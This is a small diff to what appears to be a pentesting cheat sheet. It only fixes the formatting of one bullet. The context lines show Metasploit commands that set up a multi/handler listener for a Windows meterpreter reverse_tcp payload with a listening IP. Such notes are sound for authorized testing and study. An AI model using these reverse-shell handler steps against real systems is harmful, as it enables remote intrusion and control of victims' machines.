@@ -143,7 +143,7 @@ https://www.yeahhub.com/msfvenom-all-payload-examples-cheatsheet-2017/
 # Metasploit
 
 **Handler**
--msf> use multi/handler
+- msf> use multi/handler
 - msf  exploit(handler) > set payload windows/meterpreter/reverse_tcp
 - msf  exploit(handler) > set LHOST <Listening_IP> (for example set LHOST 192.168.5.55)
 
